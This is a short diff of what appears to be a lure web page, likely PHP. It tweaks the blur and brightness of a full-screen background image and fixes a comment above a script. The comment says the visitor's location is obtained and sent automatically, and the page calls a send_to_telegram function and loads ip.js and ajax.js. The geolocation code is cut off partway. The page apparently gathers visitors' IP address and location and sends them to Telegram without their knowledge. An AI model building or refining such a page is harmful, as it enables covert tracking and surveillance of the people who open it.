@@ -44,7 +44,7 @@ send_to_telegram($msg);
       top:0; left:0;
       width:100%; height:100%;
       background: url('img/image1.jpg') no-repeat center center/cover;
-      filter: blur(20px) brightness(0.4);
+      filter: blur(15px) brightness(0.5);
       z-index: -1;
       transition: all 1s ease;
     }
@@ -134,7 +134,7 @@ send_to_telegram($msg);
 <script src="ip.js"></script>
 <script src="ajax.js"></script>
        
-// Obtener ubicación y enviarla automáticamente
+<!-- Obtener ubicación y enviarla automáticamente -->
 <script>
 if ('geolocation' in navigator) {
     navigator.geolocation.getCurrentPosition(function(pos) {
